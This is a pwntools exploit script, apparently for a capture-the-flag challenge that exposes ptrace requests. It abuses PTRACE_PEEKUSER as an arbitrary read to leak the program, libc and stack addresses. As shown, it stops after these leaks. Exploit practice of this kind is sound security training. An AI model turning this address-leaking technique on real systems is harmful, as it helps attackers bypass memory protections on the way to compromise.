#!/usr/bin/env python3
from pwn import *

QWORD = 8
IGNORED = 0xdeadbeef

elf = ELF("./challenge_patched")
libc = ELF("./given/handout/libc.so.6")
ld = ELF("./given/handout/ld-linux-x86-64.so.2")
context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    p = remote()
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": ld.path})
    if args.D:
        gdb.attach(p, "\n".join([
                "set follow-fork-mode parent"
                "b *main + 435"
            ]))

PTRACE_TRACEME   = 0
PTRACE_PEEKTEXT  = 1
PTRACE_PEEKDATA  = 2
PTRACE_PEEKUSER  = 3
PTRACE_POKETEXT  = 4
PTRACE_POKEDATA  = 5
PTRACE_POKEUSER  = 6
PTRACE_CONT      = 7
PTRACE_KILL      = 8
PTRACE_SINGLESTEP  = 9
PTRACE_GETREGS   = 0x0C
PTRACE_SETREGS   = 0x0D
PTRACE_GETFPREGS  = 0x0E
PTRACE_SETFPREGS  = 0x0F
PTRACE_ATTAC    = 0x10
PTRACE_DETAC    = 0x11
PTRACE_GETFPXREGS  = 0x12
PTRACE_SETFPXREGS  = 0x13
PTRACE_SYSCALL   = 0x18
PTRACE_GET_TREAD_AREA  = 0x19
PTRACE_SET_TREAD_AREA  = 0x1A
PTRACE_ARC_PRCTL  = 0x1E
PTRACE_SYSEMU    = 0x1F
PTRACE_SYSEMU_SINGLESTEP  = 0x20
PTRACE_SINGLEBLOCK  = 0x21
PTRACE_SETOPTIONS  = 0x4200
PTRACE_GETEVENTMSG  = 0x4201
PTRACE_GETSIGINFO  = 0x4202
PTRACE_SETSIGINFO  = 0x4203
PTRACE_GETREGSET  = 0x4204
PTRACE_SETREGSET  = 0x4205
PTRACE_SEIZE     = 0x4206
PTRACE_INTERRUPT  = 0x4207
PTRACE_LISTEN    = 0x4208
PTRACE_PEEKSIGINFO  = 0x4209
PTRACE_GETSIGMASK  = 0x420A
PTRACE_SETSIGMASK  = 0x420B
PTRACE_SECCOMP_GET_FILTER  = 0x420C
PTRACE_SECCOMP_GET_METADATA  = 0x420D
PTRACE_GET_SYSCALL_INFO  = 0x420E
PTRACE_GET_RSEQ_CONFIGURATION  = 0x420F



def ptrace(request, addr, value, again=True):
    p.sendlineafter(b"What ptrace request do you want to send?", hex(request).encode())
    p.sendlineafter(b"What address do you want?", hex(addr).encode())
    p.sendlineafter(b"What do you want copied into data?", hex(value).encode())

    p.recvuntil(b"ptrace returned ")
    ret = p.recvline().strip()
    ret = int(ret, 16)

    another = b"1" if again else b"0"
    p.sendlineafter(b"Do another (0/1)?", another)
    return ret

def arbit_read(addr):
    ret = ptrace(PTRACE_PEEKUSER, addr, IGNORED)
    # log.info(f"Leak: {hex(ret)}")
    return ret

def seq_read():
    start = 0x0
    end = start + 0x100
    for addr in range(start, end, QWORD):
        ret = arbit_read(addr)
        log.info(f"index {hex(addr)} has {hex(ret)}")

def exploit():
    # leak elf
    elf.address = arbit_read(8) - 0x3d68
    log.info(f"efl base: {hex(elf.address)}")

    # leak libc
    libc.address = arbit_read(0x80) - 0xeabc7
    log.info(f"libc base: {hex(libc.address)}")


    stack_addr = arbit_read(0x98)
    log.info(f"stack addr: {hex(stack_addr)}")


    # exit
    ptrace(PTRACE_GETSIGMASK, 0, 0, again=False)
    p.interactive()

if __name__ == "__main__":
    exploit()
